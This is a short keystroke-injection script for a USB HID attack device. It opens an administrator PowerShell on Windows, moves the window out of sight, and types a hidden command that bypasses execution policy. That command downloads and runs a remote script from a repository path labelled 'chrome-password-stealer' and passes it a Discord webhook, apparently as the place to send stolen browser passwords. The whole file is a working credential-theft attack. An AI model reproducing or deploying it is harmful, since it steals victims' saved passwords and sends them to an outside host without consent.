// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,1000,1000,16512)')
  	press("ENTER");
}

// Open an interactive PowerShell console (host architecture)
function startPSAsAdmin() {
	press("GUI r");
	delay(500);
	type("powershell")
  	delay(500);
  	press("CTRL SHIFT ENTER")
  	delay(500);
  	press("SHIFT TAB");
  	press("ENTER");
}

layout('us'); // US keyboard layout
fast();

delay(5000)
startPSAsAdmin();
delay(500);
hidePS();
delay(500);
type('powershell -w h -NoP -NonI -Exec Bypass -c "cd $env:USERPROFILE/Documents ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/chrome-password-stealer/starter.ps1 -OutFile $Env:USERPROFILE/Documents/starter.ps1 ; powershell.exe -File ./starter.ps1 -webhookUrl "https://discord.com/api/webhooks/1140612515286499399/u5g7s3uMCSoJNCr3chf8xqpb94Jh2lYbhn7Lrw3_jqjfxXuNUUiNACq2VNtE4UaR-dkH""')
delay(100);
press("ENTER")
